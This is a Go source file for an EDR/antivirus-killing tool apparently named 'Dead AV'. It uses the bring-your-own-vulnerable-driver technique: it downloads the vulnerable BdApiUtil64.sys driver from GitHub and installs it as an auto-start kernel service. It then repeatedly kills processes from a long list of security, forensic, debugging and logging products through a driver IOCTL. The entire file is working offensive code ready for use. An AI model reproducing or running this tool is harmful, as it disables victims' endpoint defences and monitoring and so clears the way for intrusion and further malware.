package main

import (
	_ "embed"
	"fmt"
	"log"
	"os"
	"os/signal"
	"path/filepath"
	"strings"
	"time"
	"unicode/utf16"
	"unsafe"
	"github.com/carved4/go-wincall"
	"avk/pkg/kernel"
	"avk/pkg/net"
	"runtime/debug"
)



const (
	SC_MANAGER_CREATE_SERVICE = 0x0002
	SERVICE_ALL_ACCESS        = 0xF01FF
	SERVICE_KERNEL_DRIVER     = 0x00000001
	SERVICE_AUTO_START        = 0x00000002
	SERVICE_ERROR_NORMAL      = 0x00000001
	SERVICE_CONTROL_STOP      = 0x00000001
	SERVICE_STOPPED           = 0x00000001
	SERVICE_NO_CHANGE         = 0xFFFFFFFF
	OPEN_EXISTING             = 3
	GENERIC_READ              = 0x80000000
	GENERIC_WRITE             = 0x40000000
	FILE_ATTRIBUTE_NORMAL     = 0x80
	INVALID_HANDLE_VALUE      = ^uintptr(0)
	TH32CS_SNAPPROCESS        = 0x00000002
	MAX_PATH                  = 260
)


func Call(dllName, funcName string, args ...interface{}) (uintptr, error) {
	moduleHash := wincall.GetHash(dllName)
	moduleBase := wincall.GetModuleBase(moduleHash)
	if moduleBase == 0 {
		moduleBase = wincall.LoadLibraryW(dllName)
	}
	
	result, err := wincall.Call(dllName, funcName, args...)
	return result, err
}


func UTF16ToString(s []uint16) string {
	for i, v := range s {
		if v == 0 {
			s = s[:i]
			break
		}
	}
	return string(utf16.Decode(s))
}


func getDriverPath() (string, error) {
	exePath, err := os.Executable()
	if err != nil {
		return "", err
	}
	exeDir := filepath.Dir(exePath)
	return filepath.Join(exeDir, "BdApiUtil64.sys"), nil
}


func DownloadAndExtractDriver() error {
	driverURL := "https://github.com/BlackSnufkin/BYOVD/raw/refs/heads/main/BdApiUtil-Killer/BdApiUtil64.sys"
	buff, err := net.DownloadToMemory(driverURL)
	if err != nil {
		return err
	}

	path, err := getDriverPath()
	if err != nil {
		return err
	}
	return os.WriteFile(path, buff, 0644)
}


type PROCESSENTRY32 struct {
	Size              uint32
	Usage             uint32
	ProcessID         uint32
	DefaultHeapID     uintptr
	ModuleID          uint32
	Threads           uint32
	ParentProcessID   uint32
	PriClassBase      int32
	Flags             uint32
	ExeFile           [MAX_PATH]uint16
}


type DriverConfig struct {
	Name       string
	DevicePath string
	IOCTLCode  uint32
}


var BdApiUtilDriver = DriverConfig{
	Name:       "BdApiUtil64",
	DevicePath: "\\\\.\\BdApiUtil",
	IOCTLCode:  0x800024B4,
}


var TargetProcesses = []string{
	"MsMpEng.exe",
	"MpCmdRun.exe",
	"NisSrv.exe",
	"SecurityHealthSystray.exe",
	"SecurityHealthService.exe",
	"SgrmBroker.exe",
	"MpDefenderCoreService.exe",
	"smartscreen.exe",
	"msmpeng.exe",
	"CSFalconService.exe",
	"CSFalconContainer.exe",
	"falcon-sensor.exe",
	"CSAuth.exe",
	"CSDeviceControl.exe",
	"CSFalconHost.exe",
	"CSFalconService.exe",
	"cs-winserver.exe",
	"SentinelAgent.exe",
	"SentinelHelperService.exe",
	"SentinelServiceHost.exe",
	"SentinelAgentWorker.exe",
	"SentinelBrowserExtensionHost.exe",
	"SentinelCtl.exe",
	"SentinelStaticEngine.exe",
	"LogProcessorService.exe",
	"cb.exe",
	"cbcomms.exe",
	"cbstream.exe",
	"confer.exe",
	"RepMgr.exe",
	"CbDefense.exe",
	"cbagent.exe",
	"CbOsxSensorService.exe",
	"carbonblack.exe",
	"ccSvcHst.exe",
	"NortonSecurity.exe",
	"ProtectionUtilSurrogate.exe",
	"SepMasterService.exe",
	"SmcService.exe",
	"SNAC64.exe",
	"smc.exe",
	"SmcGui.exe",
	"ccApp.exe",
	"rtvscan.exe",
	"DefWatch.exe",
	"Rtvscan.exe",
	"navapsvc.exe",
	"NAVAPSVC.exe",
	"navapw32.exe",
	"Norton_Security.exe",
	"nis.exe",
	"nisum.exe",
	"nsWscSvc.exe",
	"Norton360.exe",
	"McAPExe.exe",
	"mfefire.exe",
	"mfemms.exe",
	"mfevtp.exe",
	"ModuleCoreService.exe",
	"PEFService.exe",
	"ProtectedModuleHost.exe",
	"masvc.exe",
	"mcagent.exe",
	"naPrdMgr.exe",
	"firesvc.exe",
	"mfeann.exe",
	"mcshield.exe",
	"vstskmgr.exe",
	"engineserver.exe",
	"mfevtps.exe",
	"mfecanary.exe",
	"HipShieldK.exe",
	"MfeEpeHost.exe",
	"MfeAVSvc.exe",
	"mcuimgr.exe",
	"EPOAgent.exe",
	"PccNTMon.exe",
	"TMBMSRV.exe",
	"TmCCSF.exe",
	"TMLWfMgr.exe",
	"TmPfw.exe",
	"TmProxy.exe",
	"TmWSWSvc.exe",
	"UfSeAgnt.exe",
	"TmListen.exe",
	"TmPreFilter.exe",
	"coreServiceShell.exe",
	"CoreFrameworkHost.exe",
	"TrendMicroDFLauncher.exe",
	"ApexOne.exe",
	"TrendMicro.exe",
	"TrendMicroSecurity.exe",
	"CCSF.exe",
	"NTRTScan.exe",
	"tmlisten.exe",
	"CNTAoSMgr.exe",
	"TmESMgr.exe",
	"TMBMServer.exe",
	"avp.exe",
	"avpui.exe",
	"klnagent.exe",
	"vapm.exe",
	"KAVFS.exe",
	"kavtray.exe",
	"kavstart.exe",
	"avpsus.exe",
	"kav.exe",
	"kavss.exe",
	"kavpfprc.exe",
	"klbackupapl.exe",
	"klwtblfs.exe",
	"ksde.exe",
	"ksdeui.exe",
	"klnagent.exe",
	"klcsrv.exe",
	"klswd.exe",
	"klnagent64.exe",
	"ekrn.exe",
	"egui.exe",
	"eelam.exe",
	"eamonm.exe",
	"eguiProxy.exe",
	"ehdrv.exe",
	"EHttpSrv.exe",
	"ekrnEpfw.exe",
	"ESCANMON.exe",
	"eShield.exe",
	"ERAAgentSvc.exe",
	"ERAAgent.exe",
	"escanpro.exe",
	"esets_daemon.exe",
	"eset_service.exe",
	"bdagent.exe",
	"bdwtxag.exe",
	"vsserv.exe",
	"update.exe",
	"bdservicehost.exe",
	"bdntwrk.exe",
	"bdss.exe",
	"bdredline.exe",
	"bdreinit.exe",
	"bdselfpr.exe",
	"bdsubwiz.exe",
	"bdsubmitwiz.exe",
	"BDReinit.exe",
	"psimreal.exe",
	"livesrv.exe",
	"bdapppassmgr.exe",
	"ProductAgentService.exe",
	"bdparentalservice.exe",
	"atc.exe",
	"HuntressAgent.exe",
	"mbamservice.exe",
	"mbamtray.exe",
	"mbam.exe",
	"MBAMProtector.exe",
	"MBAMService.exe",
	"MBAMWebProtection.exe",
	"mbamscheduler.exe",
	"mbae.exe",
	"mbae-svc.exe",
	"mbae-setup.exe",
	"mbamdor.exe",
	"mbampt.exe",
	"malwarebytes_assistant.exe",
	"AvastSvc.exe",
	"AvastUI.exe",
	"aswidsagent.exe",
	"avgui.exe",
	"avgsvc.exe",
	"aswEngSrv.exe",
	"avastui.exe",
	"avastsvc.exe",
	"aswupdsv.exe",
	"aswFe.exe",
	"aswidsagenta.exe",
	"aswrdr2.exe",
	"aswRdr.exe",
	"aswRvrt.exe",
	"aswKbd.exe",
	"aswWebRepIE.exe",
	"avgfws.exe",
	"avgidsagent.exe",
	"AVGSvc.exe",
	"avgwdsvc.exe",
	"avgcsrva.exe",
	"avgcsrvx.exe",
	"xagt.exe",
	"fsdfw.exe",
	"fsdfwd.exe",
	"FireEyeEndpointService.exe",
	"HxTsr.exe",
	"xagtnotif.exe",
	"fe_avira.exe",
	"feedbacksender.exe",
	"fireeye.exe",
	"xagt_service.exe",
	"CylanceSvc.exe",
	"CyUpdate.exe",
	"CylanceUI.exe",
	"CyOptics.exe",
	"CyOpticsService.exe",
	"cylancedx64.exe",
	"CylanceDrv64.exe",
	"CylanceMemDef64.exe",
	"WRSA.exe",
	"WRSkyClient.exe",
	"WRCore.exe",
	"WRConsumerService.exe",
	"WRSVC.exe",
	"WebrootSecureAnywhere.exe",
	"WRUpgradeSvc.exe",
	"WRkrn.exe",
	"wrhelper.exe",
	"ALsvc.exe",
	"SAVAdminService.exe",
	"SavService.exe",
	"swi_service.exe",
	"wscsvc.exe",
	"HuntressAgent.exe",
	"sophosfs.exe",
	"SophosCleanupTool.exe",
	"SAVService.exe",
	"swi_filter.exe",
	"swc_service.exe",
	"swi_fc.exe",
	"SophosUI.exe",
	"SophosFileScanner.exe",
	"SophosHealthService.exe",
	"SophosNtpService.exe",
	"SophosNetFilter.exe",
	"SophosSafestore64.exe",
	"SophosEndpointDefense.exe",
	"HitmanPro.exe",
	"HitmanPro.Alert.exe",
	"hmpalert.exe",
	"cpda.exe",
	"ZoneAlarm.exe",
	"zlclient.exe",
	"zonealarm.exe",
	"vsmon.exe",
	"zatray.exe",
	"CheckPointAV.exe",
	"cpda_svc.exe",
	"cpdaemon.exe",
	"fsav.exe",
	"fsgk32st.exe",
	"fsma32.exe",
	"fshdll32.exe",
	"fssm32.exe",
	"fnrb32.exe",
	"fsav32.exe",
	"fsgk32.exe",
	"fsdfwd.exe",
	"fshoster32.exe",
	"fsguiexe.exe",
	"fsuninst.exe",
	"fs_ccf.exe",
	"fspex.exe",
	"fsqh.exe",
	"fswp.exe",
	"AVK.exe",
	"AVKProxy.exe",
	"AVKService.exe",
	"AVKWCtl.exe",
	"GdScan.exe",
	"gdsc.exe",
	"GDFirewallTray.exe",
	"GdBgInx64.exe",
	"AVKRes.exe",
	"AVKTray.exe",
	"PSANHost.exe",
	"PSUAConsole.exe",
	"PSUAMain.exe",
	"PSUAService.exe",
	"PavFnSvr.exe",
	"Pavsrv51.exe",
	"PavPrSrv.exe",
	"PavFnSvr.exe",
	"AVENGINE.exe",
	"PandaAntivirus.exe",
	"psimreal.exe",
	"livesrv.exe",
	"pandatray.exe",
	"PandaService.exe",
	"FortiClient.exe",
	"FCDBLog.exe",
	"FortiProxy.exe",
	"FortiESNAC.exe",
	"FortiSettings.exe",
	"FortiTray.exe",
	"FCAppDb.exe",
	"FCConfig.exe",
	"FCHelpDB.exe",
	"FCSAConnector.exe",
	"FCHookDll.exe",
	"FCCrypto.exe",
	"cmdagent.exe",
	"cavwp.exe",
	"cfp.exe",
	"cmdvirth.exe",
	"CisSvc.exe",
	"CisTray.exe",
	"cmdlineparser.exe",
	"cavwp.exe",
	"cis.exe",
	"cistray.exe",
	"cfpconfg.exe",
	"cfplogvw.exe",
	"cfpupdat.exe",
	"cytray.exe",
	"cyserver.exe",
	"CyveraService.exe",
	"cyoptics.exe",
	"cytool.exe",
	"cyupdate.exe",
	"CyveraConsole.exe",
	"cortex.exe",
	"traps.exe",
	"MpCmdRun.exe",
	"MsMpEng.exe",
	"msseces.exe",
	"MSASCui.exe",
	"MSASCuiL.exe",
	"ForefrontEndpointProtection.exe",
	"ProcessHacker.exe",
	"procexp.exe",
	"procexp64.exe",
	"procmon.exe",
	"procmon64.exe",
	"WinAPIOverride.exe",
	"apimonitor.exe",
	"ollydbg.exe",
	"x64dbg.exe",
	"x32dbg.exe",
	"windbg.exe",
	"idaq.exe",
	"idaq64.exe",
	"idaw.exe",
	"idaw64.exe",
	"scylla.exe",
	"scylla_x64.exe",
	"pestudio.exe",
	"LordPE.exe",
	"SysAnalyzer.exe",
	"sniff_hit.exe",
	"winpooch.exe",
	"ZwClose.exe",
	"ZwSetInformationThread.exe",
	"ExtremeDumper.exe",
	"peid.exe",
	"ImportREC.exe",
	"IMMUNITYDEBUGGER.exe",
	"MegaDumper.exe",
	"StringsGUI.exe",
	"Wireshark.exe",
	"tcpview.exe",
	"autoruns.exe",
	"autorunsc.exe",
	"filemon.exe",
	"regmon.exe",
	"PEiD.exe",
	"LordPE.exe",
	"SysInspector.exe",
	"proc_analyzer.exe",
	"sysinfo.exe",
	"sniff_hit.exe",
	"joeboxcontrol.exe",
	"joeboxserver.exe",
	"ResourceHacker.exe",
	"x64NetDumper.exe",
	"Fiddler.exe",
	"httpdebugger.exe",
	"Cff Explorer.exe",
	"Sysinternals.exe",
	"inlinehook.exe",
	"AntiXen.exe",
	"SbieSvc.exe",
	"SbieCtrl.exe",
	"SandboxieRpcSs.exe",
	"SandboxieCrypto.exe",
	"SandboxieDcomLaunch.exe",
	"SandboxieBITS.exe",
	"SandboxieLogon.exe",
	"SandboxieLsa.exe",
	"SandboxieDcomLaunch.exe",
	"elastic-agent.exe",
	"elastic-endpoint.exe",
	"winlogbeat.exe",
	"filebeat.exe",
	"packetbeat.exe",
	"metricbeat.exe",
	"heartbeat.exe",
	"osqueryi.exe",
	"osqueryd.exe",
	"velociraptor.exe",
	"wazuh-agent.exe",
	"OrcAgentSvc.exe",
	"orcagent.exe",
	"WinCollect.exe",
	"nxlog.exe",
	"splunk.exe",
	"splunkd.exe",
	"splunk-admon.exe",
	"splunk-winevtlog.exe",
	"splunk-regmon.exe",
	"splunk-netmon.exe",
	"UniversalAgent.exe",
	"CSAgent.exe",
	"CSFalcon.exe",
	"qualys.exe",
	"QualysAgent.exe",
	"BeyondTrust.exe",
	"BeyondTrustAgent.exe",
	"CyberArkAgent.exe",
	"CyberArk.exe",
	"TaniumClient.exe",
	"TaniumDetectEngine.exe",
	"TaniumCX.exe",
	"TaniumTraceEngine.exe",
	"TaniumEndpointIndex.exe",
	"TaniumDetect.exe",
	"TaniumThreatResponse.exe",
	"RedCanary.exe",
	"RedCanaryAgent.exe",
	"redcanaryd.exe",
	"DarktraceAgent.exe",
	"darktrace.exe",
	"DarktraceSensor.exe",
	"LimaCharlie.exe",
	"rphcp.exe",
	"rpHCP_HostBasedSensor.exe",
	"CynetEPS.exe",
	"cynet.exe",
	"CynetMonitor.exe",
	"DeepInstinct.exe",
	"DeepInstinctAgent.exe",
	"DI_Host.exe",
	"esensor.exe",
	"elastic-endpoint-security.exe",
	"endgame.exe",
}


type BYOVD struct {
	config    DriverConfig
	scManager uintptr
	service   uintptr
}


func NewBYOVD(config DriverConfig) (*BYOVD, error) {
	scManager, err := Call("advapi32.dll", "OpenSCManagerW", uintptr(0), uintptr(0), SC_MANAGER_CREATE_SERVICE)
	
	if scManager == 0 {
		lastError, _ := Call("kernel32.dll", "GetLastError")
		return nil, fmt.Errorf("failed to open service manager, error code: %d", lastError)
	}

	byovd := &BYOVD{
		config:    config,
		scManager: scManager,
	}

	serviceName, _ := wincall.UTF16PtrFromString(config.Name)
	service, err := Call("advapi32.dll", "OpenServiceW", scManager, uintptr(unsafe.Pointer(serviceName)), SERVICE_ALL_ACCESS)
	
	if err != nil || service == 0 {
		service, err = byovd.createService()
		if err != nil {
			wincall.Call("advapi32.dll", "CloseServiceHandle", scManager)
			return nil, fmt.Errorf("failed to create service: %v", err)
		}
	} else {
		// Service exists; make sure its ImagePath points to our current extracted driver
		driverPath, derr := getDriverPath()
		if derr == nil {
			binaryPath, _ := wincall.UTF16PtrFromString(driverPath)
			// BOOL ChangeServiceConfigW(
			//   SC_HANDLE hService,
			//   DWORD dwServiceType,
			//   DWORD dwStartType,
			//   DWORD dwErrorControl,
			//   LPCWSTR lpBinaryPathName,
			//   LPCWSTR lpLoadOrderGroup,
			//   LPDWORD lpdwTagId,
			//   LPCWSTR lpDependencies,
			//   LPCWSTR lpServiceStartName,
			//   LPCWSTR lpPassword,
			//   LPCWSTR lpDisplayName
			// )
			Call("advapi32.dll", "ChangeServiceConfigW",
				service,
				SERVICE_NO_CHANGE,
				SERVICE_NO_CHANGE,
				SERVICE_NO_CHANGE,
				uintptr(unsafe.Pointer(binaryPath)),
				0, 0, 0, 0, 0, 0,
			)
		}
	}
	byovd.service = service
	return byovd, nil
}


func (b *BYOVD) createService() (uintptr, error) {
	driverPath, err := getDriverPath()
	if err != nil {
		return 0, fmt.Errorf("failed to get driver path: %v", err)
	}

	if _, err := os.Stat(driverPath); os.IsNotExist(err) {
		return 0, fmt.Errorf("driver file not found: %s (extraction may have failed)", driverPath)
	}

	serviceName, _ := wincall.UTF16PtrFromString(b.config.Name)
	serviceDisplayName, _ := wincall.UTF16PtrFromString(b.config.Name)
	binaryPath, _ := wincall.UTF16PtrFromString(driverPath)
	service, err := Call("advapi32.dll", "CreateServiceW",
		b.scManager,
		uintptr(unsafe.Pointer(serviceName)),
		uintptr(unsafe.Pointer(serviceDisplayName)),
		SERVICE_ALL_ACCESS,
		SERVICE_KERNEL_DRIVER,
		SERVICE_AUTO_START,
		SERVICE_ERROR_NORMAL,
		uintptr(unsafe.Pointer(binaryPath)),
		0, 0, 0, 0, 0)

	if err != nil || service == 0 {
		return 0, fmt.Errorf("CreateServiceW failed: %v", err)
	}

	return service, nil
}

func (b *BYOVD) Start() error {
	ret, err := Call("advapi32.dll", "StartServiceW", b.service, 0, 0)
	if err != nil {
		return fmt.Errorf("failed to call StartServiceW: %v", err)
	}
	if ret == 0 {
		lastError, _ := Call("kernel32.dll", "GetLastError")
		if lastError == 1056 {
			return nil
		}
		return fmt.Errorf("failed to start service, error code: %d", lastError)
	}
	return nil
}


func (b *BYOVD) Stop() error {
	serviceStatus := make([]byte, 28)
	wincall.Call("advapi32.dll", "ControlService", b.service, SERVICE_CONTROL_STOP, uintptr(unsafe.Pointer(&serviceStatus[0])))
	
	ret, _ := wincall.Call("advapi32.dll", "DeleteService", b.service)
	if ret != 0 {
		fmt.Println("[-] service marked for deletion")
	}
	
	return nil
}


func (b *BYOVD) Close() {
	if b.service != 0 {
		wincall.Call("advapi32.dll", "CloseServiceHandle", b.service)
	}
	if b.scManager != 0 {
		wincall.Call("advapi32.dll", "CloseServiceHandle", b.scManager)
	}
}


func (b *BYOVD) KillProcess(pid uint32) error {

	devicePath, _ := wincall.UTF16PtrFromString(b.config.DevicePath)
	deviceHandle, err := Call("kernel32.dll", "CreateFileW",
		uintptr(unsafe.Pointer(devicePath)),
		GENERIC_READ|GENERIC_WRITE,
		0,
		0,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		0)

	if err != nil || deviceHandle == INVALID_HANDLE_VALUE {
		return fmt.Errorf("failed to open driver device: %v", err)
	}
	defer wincall.Call("kernel32.dll", "CloseHandle", deviceHandle)
	

	var bytesReturned uint32
	var outputBuffer uint32

	ret, err := Call("kernel32.dll", "DeviceIoControl",
		deviceHandle,
		uintptr(b.config.IOCTLCode),
		uintptr(unsafe.Pointer(&pid)),
		4, 
		uintptr(unsafe.Pointer(&outputBuffer)),
		4,
		uintptr(unsafe.Pointer(&bytesReturned)),
		0)

	if err != nil {
		return fmt.Errorf("DeviceIoControl call failed: %v", err)
	}
	if ret == 0 {
		lastError, _ := Call("kernel32.dll", "GetLastError")
		return fmt.Errorf("DeviceIoControl failed, error code: %d", lastError)
	}

	return nil
}

func GetPIDByName(processName string) (uint32, error) {
	snapshot, err := Call("kernel32.dll", "CreateToolhelp32Snapshot", TH32CS_SNAPPROCESS, uintptr(0))
	if err != nil || snapshot == INVALID_HANDLE_VALUE {
		return 0, fmt.Errorf("failed to create process snapshot: %v", err)
	}
	defer Call("kernel32.dll", "CloseHandle", snapshot)

	var pe32 PROCESSENTRY32
	pe32.Size = uint32(unsafe.Sizeof(pe32))

	ret, err := Call("kernel32.dll", "Process32FirstW", snapshot, uintptr(unsafe.Pointer(&pe32)))
	if err != nil || ret == 0 {
		return 0, fmt.Errorf("failed to get first process: %v", err)
	}

	targetName := strings.ToLower(processName)

	for {
		exeName := UTF16ToString(pe32.ExeFile[:])
		if strings.ToLower(exeName) == targetName {
			return pe32.ProcessID, nil
		}
		ret, err := Call("kernel32.dll", "Process32NextW", snapshot, uintptr(unsafe.Pointer(&pe32)))
		if err != nil || ret == 0 {
			break 
		}
	}
	return 0, fmt.Errorf("process '%s' not found", processName)
}

func main() {
	fmt.Println(`▓█████▄ ▓█████ ▄▄▄      ▓█████▄     ▄▄▄    ██▒   █▓
▒██▀ ██▌▓█   ▀▒████▄    ▒██▀ ██▌   ▒████▄ ▓██░   █▒
░██   █▌▒███  ▒██  ▀█▄  ░██   █▌   ▒██  ▀█▄▓██  █▒░
░▓█▄   ▌▒▓█  ▄░██▄▄▄▄██ ░▓█▄   ▌   ░██▄▄▄▄██▒██ █░░
░▒████▓ ░▒████▒▓█   ▓██▒░▒████▓     ▓█   ▓██▒▒▀█░  
 ▒▒▓  ▒ ░░ ▒░ ░▒▒   ▓▒█░ ▒▒▓  ▒     ▒▒   ▓▒█░░ ▐░  
 ░ ▒  ▒  ░ ░  ░ ▒   ▒▒ ░ ░ ▒  ▒      ▒   ▒▒ ░░ ░░  
 ░ ░  ░    ░    ░   ▒    ░ ░  ░      ░   ▒     ░░  
   ░       ░  ░     ░  ░   ░             ░  ░   ░  
 ░                       ░                     ░   `)
	debug.SetGCPercent(-1)
	if err := DownloadAndExtractDriver(); err != nil {
		log.Fatalf("failed to extract driver: %v", err)
	}
	time.Sleep(3 * time.Second)
	driver, err := NewBYOVD(BdApiUtilDriver)
	if err != nil {
		log.Fatalf("failed to initialize driver: %v", err)
	}
	defer driver.Close()

	if err := driver.Start(); err != nil {
		log.Printf("failed to start driver: %v", err)
		return
	}
	ntoskrnlBase, err := kernel.GetKernelModuleBase("", "ntoskrnl.exe")
	if err != nil {
		fmt.Printf("[-] failed to get ntoskrnl.exe base: %v\n", err)
	} else {
		fmt.Printf("[+] ntoskrnl.exe base address: 0x%X\n", ntoskrnlBase)
	}

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt)

	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	checkCount := 0
	totalKilled := 0

	for {
		select {
		case <-sigChan:
			fmt.Println("\n[-] shutting down...")
			goto cleanup
		case <-ticker.C:
			checkCount++
			fmt.Printf("\n[-] scan #%d - checking %d processes...\n", checkCount, len(TargetProcesses))
			
			killedThisRound := 0
			for _, processName := range TargetProcesses {
				pid, err := GetPIDByName(processName)
				if err == nil {
					fmt.Printf("[!] found %s (PID: %d)\n", processName, pid)
					err = driver.KillProcess(pid)
					if err != nil {
						fmt.Printf("[-] failed to kill %s (PID %d): %v\n", processName, pid, err)
					} else {
						fmt.Printf("[+] successfully terminated %s (PID: %d)\n", processName, pid)
						killedThisRound++
						totalKilled++
					}
				}
			}
			if killedThisRound == 0 {
				fmt.Printf("[-] no target processes found in this scan\n")
			} else {
				fmt.Printf("[+] terminated %d processes this round (Total: %d)\n", killedThisRound, totalKilled)
			}
		}
	}

cleanup:
	if err := driver.Stop(); err != nil {
		fmt.Printf("[-] failed to stop driver: %v\n", err)
	} else {
		fmt.Println("[+] driver stopped")
	}
}

